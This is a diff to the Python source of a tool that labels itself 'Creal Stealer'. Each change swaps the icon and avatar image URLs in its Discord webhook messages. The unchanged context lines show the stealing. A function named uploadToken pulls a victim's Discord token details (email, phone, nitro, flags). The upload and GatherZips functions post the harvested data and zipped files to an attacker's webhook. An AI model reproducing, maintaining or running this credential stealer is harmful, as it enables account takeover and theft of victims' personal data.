@@ -272,7 +272,7 @@ def uploadToken(token, path):
     username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
 
     if pfp == None: 
-        pfp = "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
+        pfp = "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
@@ -332,14 +332,14 @@ def uploadToken(token, path):
                 },
             "footer": {
                 "text": "Creal Stealer",
-                "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
+                "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
         "username": "Creal Stealer",
         "attachments": []
         }
@@ -373,12 +373,12 @@ def upload(name, link):
                     "color": 000000,
                     "footer": {
                         "text": "Creal Stealer",
-                        "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
+                        "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
                     }
                 }
             ],
             "username": "Creal Stealer",
-            "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -399,12 +399,12 @@ def upload(name, link):
                     "color": 000000,
                     "footer": {
                         "text": "Creal Stealer",
-                        "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
+                        "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
                     }
                 }
             ],
             "username": "Creal",
-            "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -427,12 +427,12 @@ def upload(name, link):
                 },
                 "footer": {
                     "text": "Creal Stealer",
-                    "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
+                    "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
                 }
                 }
             ],
             "username": "Creal Stealer",
-            "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -627,12 +627,12 @@ def GatherZips(paths1, paths2, paths3):
             "color": 000000,
             "footer": {
                 "text": "Creal Stealer",
-                "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
+                "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
             }
             }
         ],
         "username": "Creal Stealer",
-        "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
         "attachments": []
     }
     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
